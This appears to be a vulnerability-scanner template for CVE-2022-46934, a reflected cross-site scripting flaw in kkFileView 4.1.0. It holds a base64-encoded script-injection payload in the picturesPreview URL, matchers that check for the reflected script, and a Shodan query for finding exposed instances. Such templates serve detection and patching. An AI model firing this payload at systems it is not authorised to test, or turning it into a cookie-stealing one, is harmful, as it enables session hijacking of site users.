http:
- matchers:
  - condition: and
    type: word
    words:
    - document.getElementById("http://");alert(document.domain);//").click();
    - viewer.min.css
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/picturesPreview?currentUrl=aHR0cDovLyIpO2FsZXJ0KGRvY3VtZW50LmRvbWFpbik7Ly8=&urls'
id: CVE-2022-46934
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:keking:kkfileview:4.1.0:*:*:*:*:*:*:*
    cve-id: CVE-2022-46934
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.92519
    epss-score: 0.05604
  description: 'kkFileView 4.1.0 is susceptible to cross-site scripting via the url
    parameter at /controller/OnlinePreviewController.java. An attacker can inject
    arbitrary script in the browser of an unsuspecting user in the context of the
    affected site. This can allow the attacker to steal cookie-based authentication
    credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: kkfileview
    shodan-query: http.html:"kkFileView"
    vendor: keking
    verified: true
  name: kkFileView 4.1.0 - Cross-Site Scripting
  reference:
  - https://github.com/kekingcn/kkFileView/issues/411
  - https://nvd.nist.gov/vuln/detail/CVE-2022-46934
  remediation: 'Upgrade to a patched version of kkFileView or apply the necessary
    security patches provided by the vendor.

    '
  severity: medium
  tags: cve,cve2022,xss,kkfileview,keking
